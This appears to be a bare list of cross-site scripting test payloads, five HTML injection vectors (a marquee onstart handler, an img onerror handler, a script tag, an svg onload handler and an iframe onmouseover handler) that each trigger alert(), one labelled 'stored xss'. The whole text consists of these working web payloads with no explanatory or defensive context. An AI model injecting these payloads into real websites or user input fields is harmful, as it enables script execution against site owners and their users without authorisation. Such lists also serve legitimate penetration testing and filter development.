<marquee+onstart='alert(document.domain)'>stored xss</marquee>
<img+src=x+onerror=(a=alert,b=document.domain,a(b))>
<script>alert(1);</script>
<svg onload=alert(1)>
<iframe src=# onmouseover="alert(document.domain)"></iframe>
